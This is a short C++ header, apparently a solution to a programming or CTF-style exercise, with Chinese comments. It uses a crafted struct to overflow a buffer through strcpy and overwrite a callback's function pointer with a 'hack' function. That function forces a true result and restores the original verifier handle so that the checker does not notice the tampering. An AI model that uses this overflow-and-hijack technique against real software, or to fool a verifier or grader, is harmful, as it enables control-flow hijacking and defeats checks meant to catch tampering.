#pragma once
#include "callback.h"
#include <algorithm>
#include <iostream> // Debug

void verifier(callback &f);

void hack(callback &f) {
    // 注意, 我们的程序检测了你在 call 前后
    // handle 是否有发生改变 (1.cpp:15 行)
    // 如果被发现改变了, 会报错(有一半的分)
    // 所以记得在 call 之后 reset 回原来的 verifier.
    // 如果能成功劫持 hack 基本也差不多了
    f.reset(verifier);
    f.init_args<bool>(true);
}

void request(callback &f) {
    struct hack_buf {
        char buf[48];
        void *f;
        char padding[8] = {};
    };

    hack_buf buf;

    std::fill_n(buf.buf, 48, 'a');

    buf.f = reinterpret_cast<void *>(hack);

    // 在之后调用 std::strcpy 的时候, 就会因为缓冲区溢出
    // 导致真实 callback 的 handle 成员被覆盖为 hack 函数的地址
    // 然后在 call 的时候就会跑到 hack 里面

    f.init_args<hack_buf>(buf);
}

callback get_request() { return callback { request }; }
